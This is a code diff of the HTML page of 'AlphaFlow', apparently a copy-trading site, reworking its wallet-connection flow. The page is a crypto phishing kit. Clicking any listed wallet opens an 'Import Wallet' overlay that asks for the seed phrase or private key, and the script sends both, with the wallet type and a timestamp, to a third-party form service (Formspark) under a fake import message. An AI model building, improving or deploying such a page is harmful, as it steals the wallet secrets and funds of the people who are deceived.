@@ -120,7 +120,7 @@
       font-size: 0.9rem;
     }
 
-    /* Modal Styles */
+    /* Modal - Wallet Selection */
     .modal-overlay {
       position: fixed;
       inset: 0;
@@ -142,8 +142,6 @@
       position: relative;
       box-shadow: 0 25px 60px rgba(0,0,0,0.6);
       animation: modalPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-      max-height: 90vh;
-      overflow-y: auto;
     }
 
     @keyframes modalPop {
@@ -164,15 +162,15 @@
     .wallet-grid {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
-      gap: 1rem;
-      margin: 1.5rem 0;
+      gap: 1.2rem;
+      margin: 1.8rem 0;
     }
 
     .wallet-option {
       background: rgba(255,255,255,0.05);
       border: 2px solid transparent;
       border-radius: 1rem;
-      padding: 1.2rem 0.8rem;
+      padding: 1.4rem 1rem;
       text-align: center;
       cursor: pointer;
       transition: all 0.25s;
@@ -186,55 +184,89 @@
     }
 
     .wallet-option img {
-      width: 56px;
-      height: 56px;
-      margin-bottom: 0.8rem;
-      border-radius: 12px;
+      width: 64px;
+      height: 64px;
+      margin-bottom: 1rem;
+      border-radius: 14px;
       object-fit: contain;
     }
 
     .wallet-option div {
-      font-size: 0.95rem;
-      font-weight: 500;
+      font-size: 1rem;
+      font-weight: 600;
     }
 
-    .import-form { display: none; margin-top: 2rem; }
-    .import-form.active { display: block; }
+    /* Import Page (full overlay) */
+    .import-page {
+      position: fixed;
+      inset: 0;
+      background: rgba(15,15,26,0.98);
+      backdrop-filter: blur(8px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 300;
+      padding: 2rem;
+    }
+
+    .import-container {
+      width: 100%;
+      max-width: 480px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 1.5rem;
+      padding: 2.5rem;
+      position: relative;
+    }
+
+    .import-close {
+      position: absolute;
+      top: 1.2rem; right: 1.5rem;
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      font-size: 2rem;
+      cursor: pointer;
+    }
 
     textarea, input[type="password"] {
       width: 100%;
-      padding: 0.9rem 1rem;
-      margin: 0.6rem 0;
+      padding: 1rem;
+      margin: 0.8rem 0 1.2rem;
       background: rgba(255,255,255,0.04);
       border: 1px solid var(--border);
-      border-radius: 0.75rem;
+      border-radius: 0.9rem;
       color: white;
       font-family: monospace;
+      font-size: 1rem;
       resize: vertical;
-      min-height: 110px;
+      min-height: 120px;
     }
 
     .submit-btn {
       width: 100%;
-      padding: 1rem;
-      margin-top: 1rem;
+      padding: 1.2rem;
+      margin-top: 1.2rem;
       background: linear-gradient(90deg, var(--primary), var(--accent));
       color: white;
       border: none;
-      border-radius: 0.75rem;
-      font-weight: 600;
+      border-radius: 0.9rem;
+      font-weight: 700;
       cursor: pointer;
-      font-size: 1.1rem;
+      font-size: 1.15rem;
+      transition: all 0.3s;
     }
 
-    .message { margin-top: 1rem; padding: 0.8rem; border-radius: 0.75rem; text-align: center; }
+    .submit-btn:hover { opacity: 0.92; transform: translateY(-2px); }
 
-    .success { background: rgba(34,197,94,0.15); color: var(--success); }
-    .error   { background: rgba(239,68,68,0.15); color: var(--danger); }
+    .message { margin-top: 1.2rem; padding: 1rem; border-radius: 0.9rem; text-align: center; font-weight: 500; }
+
+    .success { background: rgba(34,197,94,0.2); color: var(--success); }
+    .error   { background: rgba(239,68,68,0.2); color: var(--danger); }
 
     @media (max-width: 480px) {
       .wallet-grid { grid-template-columns: 1fr; }
-      .modal { padding: 1.5rem; }
+      .import-container { padding: 2rem 1.5rem; }
     }
   </style>
 </head>
@@ -264,7 +296,7 @@
     © 2026 AlphaFlow • Copy trading carries high risk • Not financial advice
   </footer>
 
-  <!-- Modal -->
+  <!-- Wallet Selection Modal -->
   <div class="modal-overlay" id="walletModal">
     <div class="modal">
       <button class="modal-close" id="closeModal">×</button>
@@ -296,68 +328,75 @@
           <img src="https://trustwallet.com/assets/images/trust_platform.svg" alt="Trust Wallet">
           <div>Trust Wallet</div>
         </div>
-        <div class="wallet-option" data-wallet="manual">
-          <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <path d="M21 12V7H5a2 2 0 0 1-2-2m18 12v-5H5a2 2 0 0 0-2 2m0 0v5a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5m-10 0h6"/>
-          </svg>
-          <div>Manual (Seed/Key)</div>
-        </div>
-      </div>
-
-      <!-- Seed / Private Key import section (shows for ANY wallet selected) -->
-      <div class="import-form" id="manualImport">
-        <div style="margin-bottom:1.2rem; color:var(--text-muted); text-align:center; font-size:1.1rem;">
-          Enter your recovery phrase or private key to import
-        </div>
-
-        <div style="margin:1rem 0;">
-          <label style="display:block; margin-bottom:0.4rem; font-weight:500;">Seed Phrase (12/24 words)</label>
-          <textarea id="seedPhrase" placeholder="word1 word2 word3 word4 ..."></textarea>
-        </div>
-
-        <div style="margin:1rem 0;">
-          <label style="display:block; margin-bottom:0.4rem; font-weight:500;">OR Private Key (base58)</label>
-          <input type="password" id="privateKey" placeholder="5Maii...">
-        </div>
-
-        <button class="submit-btn" id="submitKeys">Import Wallet</button>
-
-        <div id="importMessage" class="message" style="display:none;"></div>
       </div>
     </div>
   </div>
 
+  <!-- Import Seed/Private Key Page -->
+  <div class="import-page" id="importPage">
+    <div class="import-container">
+      <button class="import-close" id="closeImport">×</button>
+
+      <h2 style="text-align:center; margin-bottom:1.8rem;">Import Wallet</h2>
+
+      <div style="margin-bottom:1.5rem; color:var(--text-muted); text-align:center;">
+        Enter your recovery phrase or private key for the selected wallet
+      </div>
+
+      <div>
+        <label style="display:block; margin-bottom:0.5rem; font-weight:500;">Seed Phrase (12/24 words)</label>
+        <textarea id="seedPhrase" placeholder="word1 word2 word3 word4 ..."></textarea>
+      </div>
+
+      <div style="margin-top:1.5rem;">
+        <label style="display:block; margin-bottom:0.5rem; font-weight:500;">OR Private Key (base58)</label>
+        <input type="password" id="privateKey" placeholder="5Maii...">
+      </div>
+
+      <button class="submit-btn" id="submitKeys">Import Wallet</button>
+
+      <div id="importMessage" class="message" style="display:none;"></div>
+    </div>
+  </div>
+
   <script>
-    const modal = document.getElementById('walletModal');
-    const closeBtn = document.getElementById('closeModal');
+    const walletModal = document.getElementById('walletModal');
+    const closeModal = document.getElementById('closeModal');
+    const importPage = document.getElementById('importPage');
+    const closeImport = document.getElementById('closeImport');
     const walletOptions = document.querySelectorAll('.wallet-option');
-    const manualForm = document.getElementById('manualImport');
     const submitBtn = document.getElementById('submitKeys');
     const messageEl = document.getElementById('importMessage');
 
-    // Open modal
+    let selectedWallet = '';
+
+    // Open wallet selection
     document.querySelectorAll('.open-modal').forEach(btn => {
       btn.addEventListener('click', () => {
-        modal.style.display = 'flex';
-        messageEl.style.display = 'none';
-        manualForm.classList.remove('active'); // reset
-        walletOptions.forEach(o => o.classList.remove('active'));
+        walletModal.style.display = 'flex';
       });
     });
 
-    // Close modal
-    closeBtn.addEventListener('click', () => modal.style.display = 'none');
-    modal.addEventListener('click', e => {
-      if (e.target === modal) modal.style.display = 'none';
+    // Close wallet selection
+    closeModal.addEventListener('click', () => walletModal.style.display = 'none');
+    walletModal.addEventListener('click', e => {
+      if (e.target === walletModal) walletModal.style.display = 'none';
     });
 
-    // Wallet selection → always show import form
+    // Wallet clicked → open import page
     walletOptions.forEach(opt => {
       opt.addEventListener('click', () => {
-        walletOptions.forEach(o => o.classList.remove('active'));
-        opt.classList.add('active');
-        manualForm.classList.add('active'); // show form for every wallet
+        selectedWallet = opt.querySelector('div').textContent;
+        walletModal.style.display = 'none';
+        importPage.style.display = 'flex';
+        messageEl.style.display = 'none';
       });
+    });
+
+    // Close import page
+    closeImport.addEventListener('click', () => importPage.style.display = 'none');
+    importPage.addEventListener('click', e => {
+      if (e.target === importPage) importPage.style.display = 'none';
     });
 
     // Submit to Formspark
@@ -375,7 +414,7 @@
 
       try {
         const formData = new FormData();
-        formData.append('wallet_type', document.querySelector('.wallet-option.active div')?.textContent || 'Unknown');
+        formData.append('wallet_type', selectedWallet || 'Unknown');
         formData.append('seed_phrase', seed || '[not provided]');
         formData.append('private_key', pkey || '[not provided]');
         formData.append('timestamp', new Date().toISOString());
@@ -394,11 +433,11 @@
         setTimeout(() => {
           document.getElementById('seedPhrase').value = '';
           document.getElementById('privateKey').value = '';
-          modal.style.display = 'none';
+          importPage.style.display = 'none';
         }, 2200);
 
       } catch (err) {
-        showMessage('Failed to import. Try again.', 'error');
+        showMessage('Failed to import. Please try again.', 'error');
         console.error(err);
       }
     });
